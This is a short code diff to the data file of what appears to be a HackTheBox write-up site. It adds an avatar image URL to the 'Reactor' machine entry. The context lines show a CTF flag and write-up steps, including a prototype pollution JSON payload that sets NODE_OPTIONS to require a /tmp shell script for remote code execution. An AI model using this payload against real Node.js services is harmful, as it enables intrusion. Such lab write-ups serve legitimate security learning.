@@ -257,7 +257,7 @@
         flag: "HTB{sql_1nj_4uth_byp4ss_cleared}"
       },
       reactor: {
-        title: "HTB: Reactor", badge: "Linux // Hard", os: "Linux", diff: "Hard", diffColor: "#f59e0b", port: "3000/tcp", time: "~1h 45m", vector: "Proto Pollution → RCE", hasFullWriteup: true,
+        title: "HTB: Reactor", image: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/56868ca419111fc0721393a2ffa0cefe.png" ,badge: "Linux // Hard", os: "Linux", diff: "Hard", diffColor: "#f59e0b", port: "3000/tcp", time: "~1h 45m", vector: "Proto Pollution → RCE", hasFullWriteup: true,
         nodes: [
           { phase: "ENUMERATION", title: "Next.js App Fingerprinting", body: "Port 3000 hosts a Next.js application. API routes exposed with unsanitized JSON body parsing in a merge endpoint.", code: "<span style=\"color:var(--neon-purple)\"># curl http://10.129.10.200:3000/api/config</span>\n<span style=\"color:var(--neon-cyan)\">{\"debug\":false,\"runtime\":\"nodejs18\"}</span>" },
           { phase: "EXPLOITATION", title: "Prototype Pollution via __proto__", body: "A merge endpoint recursively copies user-supplied keys including __proto__, injecting arbitrary properties onto Object.prototype.", code: "POST /api/merge\n{\n  <span style=\"color:var(--neon-purple)\">\"__proto__\"</span>: {\n    \"env\": { <span style=\"color:var(--neon-green)\">\"NODE_OPTIONS\"</span>: \"--require /tmp/shell.js\" },\n    \"shell\": \"/bin/sh\"\n  }\n}" },
